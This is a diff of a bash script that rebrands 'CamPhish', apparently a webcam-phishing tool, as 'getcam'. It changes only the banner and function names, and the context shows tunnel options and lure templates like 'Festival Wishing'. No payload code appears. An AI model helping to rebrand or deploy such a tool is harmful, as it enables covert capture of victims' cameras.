@@ -1,5 +1,5 @@
 #!/bin/bash
-# CamPhish v2.0
+# getcam v2.0
 # Powered by TechChip
 
 # Windows compatibility check
@@ -29,22 +29,15 @@ fi
 trap 'printf "\n";stop' 2
 
 banner() {
-clear
-printf "\e[1;91m"
-printf " ██████╗ █████╗ ███╗   ███╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗\n"
-printf "██╔════╝██╔══██╗████╗ ████║██╔══██╗██║  ██║██║██╔════╝██║  ██║\n"
-printf "██║     ███████║██╔████╔██║██████╔╝███████║██║███████╗███████║\n"
-printf "██║     ██╔══██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║\n"
-printf "╚██████╗██║  ██║██║ ╚═╝ ██║██║     ██║  ██║██║███████║██║  ██║\n"
-printf " ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝\n"
-printf "\e[0m"
-
-printf "\e[1;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m\n"
-printf "\e[1;91m            access all cameras with camphis\e[0m\n"
-printf "\e[1;91m        beta version | video tutorial not yet made\e[0m\n"
-printf "\e[1;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m\n"
-
-printf "\n"
+    clear
+    printf "\e[1;91m"  # Merah terang
+    printf "  ██████╗ ███████╗████████╗ ██████╗ █████╗ ███╗   ███╗\n"
+    printf " ██╔════╝ ██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗ ████║\n"
+    printf " ██║  ███╗█████╗     ██║   ██║     ███████║██╔████╔██║\n"
+    printf " ██║   ██║██╔══╝     ██║   ██║     ██╔══██║██║╚██╔╝██║\n"
+    printf " ╚██████╔╝███████╗   ██║   ╚██████╗██║  ██║██║ ╚═╝ ██║\n"
+    printf "  ╚═════╝ ╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝\n"
+    printf "\e[0m\n"
 }
 
 dependencies() {
@@ -465,7 +458,7 @@ fi
 rm -rf index3.html
 }
 
-camphish() {
+getcam() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
@@ -486,7 +479,7 @@ else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
 sleep 1
 clear
-camphish
+getcam
 fi
 }
 
@@ -496,7 +489,7 @@ printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
 sleep 1
 clear
 banner
-camphish
+getcam
 else
 printf "\n-----Choose a template----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93b Festival Wishing\e[0m\n"
@@ -525,4 +518,4 @@ fi
 
 banner
 dependencies
-camphish
+getcam
